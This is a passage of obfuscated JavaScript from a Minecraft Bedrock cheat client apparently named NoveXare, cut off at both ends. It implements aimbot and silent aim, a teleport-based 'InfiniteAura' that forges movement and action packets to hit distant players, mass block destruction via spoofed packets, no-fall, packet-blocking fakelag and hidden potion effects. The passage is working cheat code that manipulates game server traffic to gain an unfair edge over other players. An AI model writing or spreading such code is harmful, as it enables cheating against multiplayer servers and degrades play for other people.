  if (record_target && !click_mode && target_list.length > 0) {
    target_list.map(_0x3f1f3e => {
      const {
        x,
        y
      } = getEntitySize(_0x3f1f3e);
      const _0x26b4f2 = getEntityMotion(_0x3f1f3e);
      const _0x17348b = getEntityPos(_0x3f1f3e);
      const _0x2e2dd0 = getEntityName(_0x3f1f3e);
      const _0x1a4f85 = getEntityNamespace(_0x3f1f3e);
      const _0xee7fa8 = getDistanceByID(self_id, _0x3f1f3e);
      const _0x18f57a = getEntityCarriedItem(_0x3f1f3e);
      const _0x19e2d2 = getSpeed(_0x3f1f3e);
      const _0x1b613e = getEntityAttribute(_0x3f1f3e, "minecraft:health");
      const _0x5c6536 = getEntityAttribute(_0x3f1f3e, "minecraft:movement");
      const _0x23e5f9 = getEntityTypeId(_0x3f1f3e);
      const _0x1ea27c = getEntityTarget(_0x3f1f3e);
      const _0x37ddcb = getPlayerInventorySize(_0x3f1f3e);
      const _0x4bb6b3 = getPlayerHotBarSize(_0x3f1f3e);
      const {
        yaw,
        pitch
      } = getEntityRot(_0x3f1f3e);
      const _0x4e3c69 = string_format(`唯一ID:{} 昵称:{}§r 实体命名空间:{} 水平碰撞箱:{} 垂直碰撞箱:{} Mot速度:{} 
ability速度:[max:{}, min:{}, current:{}] 血量:[max:{}, min:{}, current:{}]
手持:[id:{}, namespace:{}, name:{}§r, aux:{}] 距离:{} 实体类型:{} 
仰俯角:{}° 偏航角:{}° 仇恨目标:{}^{}
移动值:[{}, {}, {}] 坐标值:[{}, {}, {}] 背包容量:{} 物品栏容量:{}`, _0x3f1f3e, _0x2e2dd0, _0x1a4f85, x.toFixed(2), y.toFixed(2), _0x19e2d2, _0x5c6536.max, _0x5c6536.min, _0x5c6536.current, _0x1b613e.max, _0x1b613e.min, _0x1b613e.current, _0x18f57a.id, _0x18f57a.namespace, _0x18f57a.name, _0x18f57a.aux, _0xee7fa8, _0x23e5f9, pitch.toFixed(2), yaw.toFixed(2), getEntityName(_0x1ea27c), _0x1ea27c, _0x26b4f2.x.toFixed(2), _0x26b4f2.y.toFixed(2), _0x26b4f2.z.toFixed(2), _0x17348b.x.toFixed(2), _0x17348b.y.toFixed(2), _0x17348b.z.toFixed(2), _0x37ddcb, _0x4bb6b3);
      clientMessage("§3§l[NoveXare] §r§7>>> §rTargetInfo §7>>>§r \n" + _0x4e3c69 + "\n§r§b==============================");
      if (save_to_file) {
        write_file(NoveXare_path + "/" + _0x2e2dd0 + "_" + _0x3f1f3e + ".txt", _0x4e3c69);
      }
    });
  }
  if (assistaim && target_list.length > 0 && findEntity(target_list[0])) {
    try {
      const _0x18e2be = target_list[0];
      const _0x2224b0 = getDistanceByID(self_id, _0x18e2be);
      const _0x4ab367 = isAimed(self_id, _0x18e2be, assistaim_Fov, 0);
      if (_0x2224b0 <= assistaim_distance && _0x4ab367 || assistaim_throw) {
        let _0x35f962 = getPlayerAngle(self_id, _0x18e2be, "yaw_rot");
        let _0x375a52 = getPlayerAngle(self_id, _0x18e2be, "pitch_rot");
        if (assistaim_silent) {
          let _0x4fc925 = getPlayerAngle(self_id, _0x18e2be, "pitch_pos");
          if (_0x4fc925 > 90) {
            _0x4fc925 -= 90;
          }
          if (_0x4fc925 < -90) {
            _0x4fc925 += 90;
          }
          let _0x245f4f = getPlayerAngle(self_id, _0x18e2be, "yaw_pos") - 180;
          if (_0x245f4f > 180) {
            _0x245f4f = _0x245f4f - 360;
          }
          if (_0x245f4f < -180) {
            _0x245f4f = 360 + _0x245f4f;
          }
          silentAim(_0x4fc925, _0x245f4f);
        } else {
          let _0x3c9722 = _0x35f962 >= 0 ? -assistaim_aim_speed : assistaim_aim_speed;
          let _0x295462 = _0x375a52 >= 0 ? assistaim_aim_speed : -assistaim_aim_speed;
          if (func_mode.assistaim_mode === 1 || func_mode.assistaim_mode === 0 && (Math.abs(_0x35f962) < assistaim_aim_speed || Math.abs(_0x375a52) < assistaim_aim_speed)) {
            _0x3c9722 = -_0x35f962 / ((31 - assistaim_aim_speed) / 2);
            _0x295462 = -_0x375a52 / ((31 - assistaim_aim_speed) / 1.125);
          }
          const _0x442b44 = isAimed(self_id, _0x18e2be, _0x3c9722 * 1.1, 1);
          const _0x2688fd = isAimed(self_id, _0x18e2be, _0x295462 * 1.1, 2);
          if (!_0x442b44) {
            setLocalPlayerTurn(0, _0x3c9722);
          }
          if (!_0x2688fd && !assistaim_throw || !isSame(_0x375a52, 0, 1) && assistaim_throw) {
            setLocalPlayerTurn(_0x295462, 0);
          }
        }
        if (show_tip) {
          const _0x509282 = rgb_tip ? "§" + rgb_color[rgb_l] : "§r";
          _0x2c4c04.push("§rAimed §7>>> §r" + getEntityName(_0x18e2be));
        }
      }
    } catch (_0xd2c468) {
      clientMessage(_0xd2c468.message);
    }
  }
  if (InfiniteAura_switch_delay == 0 && target_list.length > 0) {
    InfiniteAura_target = target_list;
  }
  if (InfiniteAura && InfiniteAura_target.length > 0 && getDistanceByID(InfiniteAura_target[0], self_id) < InfiniteAura_distance) {
    InfiniteAura_target.map(_0x1f4bc2 => {
      const _0x1ca020 = _0x1f4bc2;
      const _0x3f3c29 = getEntityPos(_0x1ca020);
      if (func_mode.server_mode === 0) {
        if (InfiniteAura_backPos && InfiniteAura_back) {
          if (func_mode.InfiniteAura_mode < 2) {
            setPos(InfiniteAura_backPos.x, InfiniteAura_backPos.y + (InfiniteAura_backY && !_0x116e53 ? 3 : 0), InfiniteAura_backPos.z);
          }
          if (func_mode.InfiniteAura_mode == 1) {
            setMotion(InfiniteAura_backMotion.x, InfiniteAura_backMotion.y + (InfiniteAura_backY && !_0x116e53 ? 3 : 0), InfiniteAura_backMotion.z);
          }
          if (func_mode.InfiniteAura_mode == 3) {
            MenuTP(InfiniteAura_backPos.x, InfiniteAura_backPos.y + (InfiniteAura_backY && !_0x116e53 ? 3 : 0), InfiniteAura_backPos.z);
          }
          if (func_mode.InfiniteAura_mode == 2) {
            executePluginCommand("/ww tp " + InfiniteAura_backPos.x + " " + InfiniteAura_backPos.y + " " + InfiniteAura_backPos.z);
          }
          if (func_mode.InfiniteAura_mode == 4) {
            sendMovePlayer({
              id: self_id,
              pos: {
                x: InfiniteAura_backPos.x,
                y: InfiniteAura_backPos.y + (InfiniteAura_backY && !_0x116e53 ? 3 : 0),
                z: InfiniteAura_backPos.z
              },
              mode: 0,
              ground: true,
              rot: {
                pitch: 0,
                yaw: 0
              },
              yHeadRot: 0
            });
          }
          if (InfiniteAura_backclick) {
            buildBlock(self_id, InfiniteAura_backPos.x, InfiniteAura_backPos.y, InfiniteAura_backPos.z, 1);
            var _0x1dbcd5 = {
              x: InfiniteAura_backPos.x,
              y: InfiniteAura_backPos.y + (InfiniteAura_backY && !_0x116e53 ? 3 : 0),
              z: InfiniteAura_backPos.z
            };
            var _0x4f8209 = {
              id: self_id,
              pos: _0x1dbcd5,
              value: 1,
              type: 25
            };
            if (func_mode.InfiniteAura_mode == 4) {
              sendPlayerAction(_0x4f8209);
            }
          }
          attack(_0x1ca020, attack_action);
        }
        if (tick == -InfiniteAura_delay) {
          InfiniteAura_num_r = InfiniteAura_num;
          InfiniteAura_backPos = self_pos;
          InfiniteAura_backMotion = _0x1b6f06;
          tick = InfiniteAura_tick;
          tphit(_0x1ca020);
        }
        if (_0x1ca020) {
          if (InfiniteAura_num_r) {
            tphit(_0x1ca020);
          } else {
            InfiniteAura_backPos = backMotion = InfiniteAura_backMotion = null;
          }
        }
        if (tick > -InfiniteAura_delay) {
          tick--;
        }
      } else if (func_mode.server_mode === 1) {
        if (tick === -InfiniteAura_delay) {
          setMotion(InfiniteAura_backMotion.x, InfiniteAura_backMotion.y, InfiniteAura_backMotion.z);
          if (InfiniteAura_back) {
            for (let _0x4e71bf = 0; _0x4e71bf < InfiniteAura_move; _0x4e71bf++) {
              sendMovePlayer({
                id: self_id,
                pos: {
                  x: InfiniteAura_backPos.x,
                  y: InfiniteAura_backPos.y + (InfiniteAura_backY && !_0x116e53 ? 3 : 0),
                  z: InfiniteAura_backPos.z
                },
                mode: 0,
                ground: true,
                rot: {
                  pitch: 0,
                  yaw: 0
                },
                yHeadRot: 0
              });
            }
          }
          if (InfiniteAura_backclick) {
            buildBlock(self_id, InfiniteAura_backPos.x, InfiniteAura_backPos.y + (InfiniteAura_backY && !_0x116e53 ? 3 : 0), InfiniteAura_backPos.z, 0);
            sendPlayerAction({
              id: self_id,
              pos: {
                x: InfiniteAura_backPos.x,
                y: InfiniteAura_backPos.y + (InfiniteAura_backY && !_0x116e53 ? 3 : 0),
                z: InfiniteAura_backPos.z
              },
              value: 1,
              type: 25
            });
          }
          tick = InfiniteAura_tick;
        }
        if (tick === 0) {
          const _0x246207 = InfiniteAura_random ? getRandomNum(-2, 2) : 0;
          InfiniteAura_backPos = self_pos;
          InfiniteAura_backMotion = _0x1b6f06;
          for (let _0x126f27 = 0; _0x126f27 < InfiniteAura_move; _0x126f27++) {
            if (func_mode.InfiniteAura_mode === 0) {
              setPos(_0x3f3c29.x, _0x3f3c29.y, _0x3f3c29.z);
            }
            if (func_mode.InfiniteAura_mode === 1) {
              Teleport(_0x3f3c29.x, _0x3f3c29.y, _0x3f3c29.z);
            }
            if (func_mode.InfiniteAura_mode === 4) {
              sendMovePlayer({
                id: self_id,
                pos: {
                  x: _0x3f3c29.x + _0x246207,
                  y: _0x3f3c29.y + InfiniteAura_yoffset / 5,
                  z: _0x3f3c29.z + _0x246207
                },
                mode: 1,
                ground: true,
                rot: {
                  pitch: 0,
                  yaw: 0
                },
                yHeadRot: 0
              });
            }
            if (InfiniteAura_click) {
              buildBlock(self_id, _0x3f3c29.x + _0x246207, _0x3f3c29.y, _0x3f3c29.z + _0x246207, 1);
              var _0x13b78b = {
                x: _0x3f3c29.x + _0x246207,
                y: _0x3f3c29.y + InfiniteAura_yoffset / 5,
                z: _0x3f3c29.z + _0x246207
              };
              var _0x58333c = {
                id: self_id,
                pos: _0x13b78b,
                value: 1,
                type: 25
              };
              sendPlayerAction(_0x58333c);
            }
          }
          if (InfiniteAura_amove) {
            setMotion(0, 0.42, 0);
          }
          for (let _0x2e6683 = 0; _0x2e6683 < InfiniteAura_num; _0x2e6683++) {
            attack(_0x1ca020, attack_action);
          }
        }
        if (tick > -InfiniteAura_delay) {
          tick--;
        }
      }
      if (show_tip) {
        _0x2c4c04.push("§rAttack §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + getEntityName(_0x1ca020));
      }
    });
  }
  if (auto_destroy) {
    const _0x24dc5e = getPlayerBlockPos(self_id);
    for (let _0x169c35 = Math.ceil(-destroy_size / 2); _0x169c35 < Math.floor(destroy_size / 2 + 1); _0x169c35++) {
      for (let _0x1cc016 = Math.ceil(-destroy_size / 2); _0x1cc016 < Math.floor(destroy_size / 2 + 1); _0x1cc016++) {
        for (let _0x52e54e = Math.ceil(-destroy_size / 2); _0x52e54e < Math.floor(destroy_size / 2 + 1); _0x52e54e++) {
          if (b_excludeFeet && _0x24dc5e.y + _0x1cc016 <= _0x24dc5e.y - 1) {
            continue;
          }
          if (replace_block) {
            setBlock(x + _0x169c35, y + _0x1cc016, z + _0x52e54e, "air", 0);
          }
          if (!replace_block) {
            destroyBlock(self_id, _0x24dc5e.x + _0x169c35, _0x24dc5e.y + _0x1cc016, _0x24dc5e.z + _0x52e54e, 0);
          }
          if (destroy_packet) {
            sendPlayerAction({
              id: self_id,
              pos: {
                x: _0x24dc5e.x + _0x169c35,
                y: _0x24dc5e.y + _0x1cc016,
                z: _0x24dc5e.z + _0x52e54e
              },
              value: 1,
              type: 0
            });
            var _0x1a115b = {
              x: _0x24dc5e.x + _0x169c35,
              y: _0x24dc5e.y + _0x1cc016,
              z: _0x24dc5e.z + _0x52e54e
            };
            var _0x8f3c03 = {
              id: self_id,
              pos: _0x1a115b,
              value: 1,
              type: 26
            };
            sendPlayerAction(_0x8f3c03);
            sendPlayerAction({
              id: self_id,
              pos: {
                x: _0x24dc5e.x + _0x169c35,
                y: _0x24dc5e.y + _0x1cc016,
                z: _0x24dc5e.z + _0x52e54e
              },
              value: 1,
              type: 18
            });
            sendPlayerAction({
              id: self_id,
              pos: {
                x: _0x24dc5e.x + _0x169c35,
                y: _0x24dc5e.y + _0x1cc016,
                z: _0x24dc5e.z + _0x52e54e
              },
              value: 1,
              type: 2
            });
          }
        }
      }
    }
  }
  if (auto_void) {
    const _0x4c3167 = getPlayerBlockPos(self_id);
    const _0x2761df = getBlock(_0x4c3167.x, _0x25c02a.y - 1, _0x4c3167.z);
    for (let _0x33ee6d = -2; _0x33ee6d < 3; _0x33ee6d++) {
      for (let _0x563645 = -2; _0x563645 < 3; _0x563645++) {
        const _0x34e4bb = getBlock(_0x4c3167.x + _0x33ee6d, _0x25c02a.y - 1, _0x4c3167.z + _0x563645);
        if (_0x34e4bb.namespace == "minecraft:air" && _0x1b6f06.y < -0.0783 && _0x1b6f06.y > -0.0785 && _0x2761df.namespace != "minecraft:air") {
          const _0x3de2b1 = getPlayerAngle(self_id, {
            x: _0x4c3167.x + _0x33ee6d,
            y: self_pos.y,
            z: _0x4c3167.z - _0x563645
          }, "yaw_pos");
          var _0x23c9de = {
            yaw: _0x3de2b1,
            pitch: 0
          };
          const _0x4d7c35 = getDisplacement(-0.5, self_pos, _0x23c9de);
          setMotion(_0x4d7c35.x - self_pos.x, _0x1b6f06.y, _0x4d7c35.z - self_pos.z);
        }
      }
    }
  }
  if (avoid_throw) {
    const _0x38de2b = getEntityList();
    _0x38de2b.map(_0x422a03 => {
      if ((getEntityTypeId(_0x422a03) == 4194389 || getEntityTypeId(_0x422a03) == 4194390 || getEntityTypeId(_0x422a03) == 12582992) && getDistanceByID(_0x422a03, self_id) <= avoid_distance) {
        if (avoid_remove) {
          removeEntity(_0x422a03);
        }
        if (func_mode.avoid_mode == 0) {
          const _0x2f87fa = getPlayerBlockPos(self_id);
          for (let _0x362740 = -2; _0x362740 < 3; _0x362740++) {
            for (let _0x451694 = -2; _0x451694 < 3; _0x451694++) {
              const _0xac1210 = getBlock(_0x2f87fa.x + _0x362740, _0x25c02a.y - 1, _0x2f87fa.z + _0x451694);
              if (_0xac1210.namespace != "minecraft:air") {
                const _0x954342 = getPlayerAngle(self_id, {
                  x: _0x2f87fa.x + _0x362740,
                  y: self_pos.y,
                  z: _0x2f87fa.z - _0x451694
                }, "yaw_pos");
                var _0x48b145 = {
                  yaw: _0x954342,
                  pitch: 0
                };
                const _0xbbe221 = getDisplacement(0.3, self_pos, _0x48b145);
                setMotion(_0xbbe221.x - self_pos.x, _0x1b6f06.y, _0xbbe221.z - self_pos.z);
              }
            }
          }
        }
        if (func_mode.avoid_mode == 1) {
          attack(_0x422a03, attack_action);
        }
        if (func_mode.avoid_mode == 2) {
          setPos(10000, 100000, 10000);
        }
      }
    });
  }
  if (throwable_particle) {
    const _0x1400e1 = getPlayerList();
    let _0x51e8b5 = [];
    let _0x4ebab2 = false;
    let _0x7bb430 = {
      x: 0,
      y: 0,
      z: 0
    };
    for (let _0x49ebef = 1; _0x49ebef <= throwable_particle_length; _0x49ebef += throwable_particle_density / 10) {
      let _0x5ac38a = getParabola(_0x49ebef, _0x513051.pitch, throwable_particle_speed, throwable_particle_gravity).data;
      var _0x4deda5 = {
        yaw: _0x513051.yaw,
        pitch: 0
      };
      let _0x1e44b3 = getDisplacement(_0x49ebef, self_pos, _0x4deda5);
      let _0x5dfc79 = getBlock(_0x1e44b3.x, _0x1e44b3.y + _0x5ac38a, _0x1e44b3.z);
      if (throwable_particle_target || !_0x4ebab2) {
        _0x1400e1.map(_0x38899a => {
          if (!_0x4ebab2) {
            let _0x400c3d = getEntityPos(_0x38899a);
            var _0x261886 = {
              x: _0x1e44b3.x,
              y: _0x1e44b3.y + _0x5ac38a,
              z: _0x1e44b3.z
            };
            let _0x42d66d = _0x261886;
            let _0x3aa85f = getEntitySize(_0x38899a);
            if (_0x42d66d.x <= _0x400c3d.x + _0x3aa85f.x / 2 && _0x42d66d.x >= _0x400c3d.x - _0x3aa85f.x / 2 && _0x42d66d.y <= _0x400c3d.y + _0x3aa85f.y / 2 && _0x42d66d.y >= _0x400c3d.y - _0x3aa85f.y / 2 && _0x42d66d.z <= _0x400c3d.z + _0x3aa85f.x / 2 && _0x42d66d.z >= _0x400c3d.z - _0x3aa85f.x / 2) {
              _0x2c4c04.push("§rHasAimed §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + getEntityName(_0x38899a));
              _0x4ebab2 = true;
            }
          }
        });
      }
      if (_0x5dfc79.namespace != "minecraft:air" || _0x4ebab2) {
        _0x7bb430 = _0x1e44b3;
        if (func_mode.throwable_particle_mode == 1 && _0x5dfc79.namespace != "minecraft:air") {
          for (let _0x2cde50 = 0; _0x2cde50 <= 20; _0x2cde50 += 2) {
            drawParticle(throwable_particle_type, _0x7bb430.x, _0x7bb430.y + _0x5ac38a + _0x2cde50 / 10, _0x7bb430.z, 1);
          }
        }
        break;
      }
    }
    if (func_mode.throwable_particle_mode == 0) {
      let _0x3ccd97 = getDistance(_0x7bb430, self_pos);
      for (let _0x1128b2 = 1; _0x1128b2 <= _0x3ccd97; _0x1128b2 += throwable_particle_density / 10) {
        let _0x16b2b0 = getParabola(_0x1128b2, _0x513051.pitch, throwable_particle_speed, throwable_particle_gravity).data;
        let _0x1c6ed1 = func_mode.throwable_particle_mode == 0 ? (throwable_particle_offset - 10) / 10 : 0;
        let _0x4e6d77 = _0x513051.yaw + 90;
        if (_0x4e6d77 > 180) {
          _0x4e6d77 = _0x4e6d77 - 360;
        }
        if (_0x4e6d77 < -180) {
          _0x4e6d77 = _0x4e6d77 + 360;
        }
        var _0x1cddd0 = {
          yaw: _0x4e6d77,
          pitch: 0
        };
        let _0x13b5d8 = getDisplacement(_0x1c6ed1, self_pos, _0x1cddd0);
        var _0xe930cf = {};
        _0xe930cf.yaw = _0x513051.yaw - Math.atan(_0x1c6ed1 / _0x3ccd97) * (180 / Math.PI);
        _0xe930cf.pitch = 0;
        let _0x99ed6e = getDisplacement(_0x1128b2, _0x13b5d8, _0xe930cf);
        let _0x4a0eed = getBlock(_0x99ed6e.x, _0x99ed6e.y + _0x16b2b0, _0x99ed6e.z);
        if (func_mode.throwable_particle_mode == 0 && _0x4a0eed.namespace == "minecraft:air") {
          drawParticle(throwable_particle_type, _0x99ed6e.x, _0x99ed6e.y + _0x16b2b0, _0x99ed6e.z, 1);
        }
      }
    }
  }
  if (farmaura) {
    const _0x191e88 = getEntityCarriedItem(self_id);
    const _0x180c4b = getPlayerBlockPos(self_id);
    for (let _0x353344 = -4; _0x353344 < 5; _0x353344++) {
      for (let _0x35f694 = -4; _0x35f694 < 5; _0x35f694++) {
        const _0xb076ed = getBlock(_0x180c4b.x + _0x353344, _0x25c02a.y - 1, _0x180c4b.z + _0x35f694);
        const _0x1d3623 = getBlock(_0x180c4b.x + _0x353344, _0x25c02a.y, _0x180c4b.z + _0x35f694);
        if ((_0xb076ed.namespace == "minecraft:dirt" || _0xb076ed.namespace == "minecraft:grass") && _0x191e88.namespace.includes("hoe")) {
          buildBlock(self_id, _0x180c4b.x + _0x353344, _0x25c02a.y - 1, _0x180c4b.z + _0x35f694, 1);
        }
        if (_0xb076ed.namespace == "minecraft:farmland" && (_0x191e88.namespace == "minecraft:beetroot_seeds" || _0x191e88.namespace == "minecraft:wheat_seeds" || _0x191e88.namespace == "minecraft:carrot" || _0x191e88.namespace == "minecraft:potato")) {
          buildBlock(self_id, _0x180c4b.x + _0x353344, _0x25c02a.y - 1, _0x180c4b.z + _0x35f694, 1);
        }
        if (_0x1d3623.aux == 7 && (_0x1d3623.namespace == "minecraft:beetroot" || _0x1d3623.namespace == "minecraft:wheat" || _0x1d3623.namespace == "minecraft:carrots" || _0x1d3623.namespace == "minecraft:potatoes")) {
          destroyBlock(self_id, _0x180c4b.x + _0x353344, _0x25c02a.y, _0x180c4b.z + _0x35f694, 1);
        }
        if (_0x191e88.namespace == "minecraft:bone_meal" && _0x1d3623.aux <= 6 && (_0x1d3623.namespace == "minecraft:beetroot" || _0x1d3623.namespace == "minecraft:wheat" || _0x1d3623.namespace == "minecraft:carrots" || _0x1d3623.namespace == "minecraft:potatoes")) {
          buildBlock(self_id, _0x180c4b.x + _0x353344, _0x25c02a.y, _0x180c4b.z + _0x35f694, 1);
        }
      }
    }
  }
  if (ChargeAura) {
    const _0x16b4ed = getEntityCarriedItem(self_id);
    const _0x35ee80 = getPlayerBlockPos(self_id);
    for (let _0x23ab9a = -4; _0x23ab9a < 5; _0x23ab9a++) {
      for (let _0x2a2ad3 = -3; _0x2a2ad3 < 4; _0x2a2ad3++) {
        for (let _0x58e3d5 = -4; _0x58e3d5 < 5; _0x58e3d5++) {
          const _0x4a8b82 = getBlock(_0x35ee80.x + _0x23ab9a, _0x35ee80.y + _0x2a2ad3, _0x35ee80.z + _0x58e3d5);
          if (_0x4a8b82.namespace == "minecraft:respawn_anchor" && _0x4a8b82.aux == 0) {
            selectPlayerInventorySlot(self_id, getItem(self_id, "glowstone"));
            buildBlock(self_id, _0x35ee80.x + _0x23ab9a, _0x35ee80.y + _0x2a2ad3, _0x35ee80.z + _0x58e3d5, 0);
          }
        }
      }
    }
  }
  if (destroy_list.length > 0 && isDestroy) {
    let _0x2b8996 = destroy_list.shift();
    const _0x5f3400 = getBlock(_0x2b8996[0], _0x2b8996[1], _0x2b8996[2]);
    if (_0x5f3400.namespace != "minecraft:air" && _0x5f3400.namespace == destroy_namespace) {
      destroyBlock(self_id, _0x2b8996[0], _0x2b8996[1], _0x2b8996[2], 0);
      if (show_tip) {
        _0x2c4c04.push("§r进度 §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + current_mine_num + "/" + mine_num);
      }
      current_mine_num++;
    }
  }
  if (action_manager) {
    if (!use_action_config) {
      if (action_tick > action_ticks) {
        for (let _0x9a2835 = 0; _0x9a2835 < action_times; _0x9a2835++) {
          sendPlayerAction({
            id: self_id,
            pos: self_pos,
            value: 1,
            type: Number(edit_action_id)
          });
        }
      }
    } else {
      const _0x49c606 = JSON.parse(readFile(NoveXare_path + "/PlayerAction.json"));
      _0x49c606.map(_0x3bedac => {
        if (_0x3bedac.delay % action_tick == 0) {
          for (let _0x4a69b0 = 0; _0x4a69b0 < _0x3bedac.count; _0x4a69b0++) {
            sendPlayerAction({
              id: self_id,
              pos: self_pos,
              value: _0x3bedac.value,
              type: Number(_0x3bedac.id)
            });
          }
        }
      });
    }
  }
  if (isDestroy && (destroy_list.length == 0 || current_mine_num >= mine_num)) {
    isDestroy = false;
    destroy_namespace = null;
    destroy_list = [];
    current_mine_num = 0;
  }
  if (auto_jump) {
    if (_0x116e53 && _0x1b6f06.y > -0.0785 && _0x1b6f06.y < -0.0783) {
      setMotion(_0x1b6f06.x, jump_strength / 100, _0x1b6f06.z);
    }
  }
  if (block_ac && !block_ac_select && ac_pos.length > 0) {
    ac_pos.map(_0x1c898d => buildBlock(self_id, _0x1c898d.x, _0x1c898d.y, _0x1c898d.z, 0));
  }
  if (_0x1b6f06.y < -0.6 && no_fall && !_0x116e53) {
    if (func_mode.nofall_mode === 0) {
      setMotion(0, 0, 0);
    }
    if (func_mode.nofall_mode === 1) {
      callModule(37, "{\"value\":true}");
      setTimeout(() => callModule(37, "{\"value\":false}"), 500);
    }
    if (func_mode.nofall_mode === 2) {
      callModule(30, "{\"value\":true,\"speed\":0}");
      setTimeout(() => callModule(30, "{\"value\":false}"), 500);
    }
    var _0x33eec1 = {
      id: self_id,
      pos: self_pos,
      value: 1,
      type: 7
    };
    if (func_mode.nofall_mode === 3) {
      sendPlayerAction(_0x33eec1);
    }
  }
  if (fakelag) {
    if (lag_t >= lag_tick + lag_last_tick) {
      if (func_mode.fakelag_mode == 0) {
        callModule(37, "{\"value\":" + b2s(!reverse_lag) + "}");
      }
      if (func_mode.fakelag_mode == 1) {
        callModule(7, "{\"packet\":\"send\",\"enable\":" + b2s(!reverse_lag) + ",\"index\":19}");
      }
      if (func_mode.fakelag_mode == 2) {
        callModule(7, "{\"packet\":\"receive\",\"enable\":" + b2s(!reverse_lag) + ",\"index\":19}");
      }
      lag_t = 0;
    }
    if (lag_t >= lag_tick) {
      if (func_mode.fakelag_mode == 0) {
        callModule(37, "{\"value\":" + b2s(reverse_lag) + "}");
      }
      if (func_mode.fakelag_mode == 1) {
        callModule(7, "{\"packet\":\"send\",\"enable\":" + b2s(reverse_lag) + ",\"index\":19}");
      }
      if (func_mode.fakelag_mode == 2) {
        callModule(7, "{\"packet\":\"receive\",\"enable\":" + b2s(reverse_lag) + ",\"index\":19}");
      }
    }
  }
  if (build_list.length > 0 && build_t > build_tick && !build_success) {
    const _0x240d91 = build_list.shift();
    HYTBuild(_0x240d91.x, _0x240d91.y, _0x240d91.z);
    build_t = 0;
    if (build_list.length == 0) {
      build_success = true;
    }
  }
  if (show_health && target_list.length > 0) {
    _0x2c4c04.push(string_format("§rInfo §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "Health: {}", getHealth(target_list[0], func_mode.health_mode)));
  }
  if (target_list.length > 0 && show_target_list) {
    _0x2c4c04.push("§rTargets §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "" + obj2str(target_list.map(_0x3925d3 => getEntityName(_0x3925d3))));
  }
  if (show_script_tip) {
    const _0xa82330 = getEntityCarriedItem(self_id);
    const _0x4a1d4f = getEntityAttribute(self_id, "minecraft:movement");
    const _0x7447a4 = Math.sqrt(_0x1b6f06.x * _0x1b6f06.x + _0x1b6f06.z * _0x1b6f06.z);
    if (show_speed) {
      _0x2c4c04.push("§rInfo §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "Motion_Hor: " + _0x7447a4.toFixed(2) + "m/s Motion_All: " + _0x43a81c.toFixed(2) + "m/s\nPos_Hor: " + _0x177706.toFixed(2) + "m/s Pos_All:" + _0x2ee94b.toFixed(2) + "m/s ability_speed:" + _0x4a1d4f.current.toFixed(2) + string_format("\nCurrentMotion: [{}, {}, {}]", _0x1b6f06.x.toFixed(2), _0x1b6f06.y.toFixed(2), _0x1b6f06.z.toFixed(2)));
    }
    if (show_pos) {
      _0x2c4c04.push("§rInfo §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "Position: " + string_format("[X:{}, Y:{}, Z:{}]", _0x25c02a.x, _0x25c02a.y, _0x25c02a.z));
    }
    if (show_item && _0xa82330.id != 0) {
      _0x2c4c04.push(string_format("§rInfo §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "{} §r§ox{}", _0xa82330.name, getItemCount(-1)));
    }
    if (show_target_dis && target_list.length > 0) {
      _0x2c4c04.push(string_format("§rInfo §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "Distance: {}m", getDistanceByID(self_id, target_list[0])));
    }
    if (show_player_list) {
      _0x2c4c04.push(string_format("§rInfo §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "WorldPlayer: {}人", _0x4a1836.length));
    }
    if (show_kill_num) {
      _0x2c4c04.push(string_format("§rInfo §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "Kills: {}人", kills));
    }
    if (show_time) {
      _0x2c4c04.push(string_format("§rInfo §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "Time: {}, Ticks: {}", timeFormat(seconds), ticks));
    }
    if (show_attack_rate) {
      _0x2c4c04.push(string_format("§rInfo §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "空刀率: {}%%, 攻击总次数: {}, 命中次数:{}, 空刀次数:{}", Math.round(empty_attack_frequency / attack_frequency * 100), attack_frequency, attack_frequency - empty_attack_frequency, empty_attack_frequency));
    }
    if (show_real_cps) {
      _0x2c4c04.push(string_format("§rInfo §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "预期CPS: {}/s, 实际CPS: {}/s", Math.round(attack_frequency / attack_ticks) * 20, Math.round((attack_frequency - empty_attack_frequency) / attack_ticks * 20)));
    }
    if (show_ping) {
      _0x2c4c04.push(string_format("§rInfo §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "延迟: {}ms", ping));
    }
  }
  if (modify_time) {
    for (let _0x4b716e = 0; _0x4b716e < 2; _0x4b716e++) {
      if (func_mode.set_time == 0) {
        setWorldData({
          time: 1000
        });
      }
      if (func_mode.set_time == 1) {
        setWorldData({
          time: 13000
        });
      }
      if (func_mode.set_time == 2) {
        setWorldData({
          time: 6000
        });
      }
      if (func_mode.set_time == 3) {
        setWorldData({
          time: 12500
        });
      }
    }
  }
  if (modify_swing) {
    if (swing_speed > 17) {
      setEntityEffect(self_id, {
        id: 3,
        duration: 2,
        amplifier: swing_speed - 17,
        displayOnScreenTextureAnimation: false,
        noCounter: true,
        effectVisible: false
      });
    } else if (swing_speed < 17) {
      setEntityEffect(self_id, {
        id: 4,
        duration: 2,
        amplifier: 17 - swing_speed,
        displayOnScreenTextureAnimation: false,
        noCounter: true,
        effectVisible: false
      });
    }
  }
  var _0x1f8237 = {
    id: 16,
    duration: 600,
    amplifier: 1,
    displayOnScreenTextureAnimation: false,
    noCounter: true,
    effectVisible: false
  };
  if (night_vision) {
    setEntityEffect(self_id, _0x1f8237);
  }
  if (rocker_func.angle != undefined) {
    const _0x546a92 = getEntityRot(self_id);
    const _0x181abc = getEntityPos(self_id);
    const _0x2a3617 = getEntityMotion(self_id);
    var _0x5306ee = Math.round(_0x546a92.yaw);
    _0x5306ee += rocker_func.angle < 90 ? rocker_func.angle + 90 : rocker_func.angle - 270;
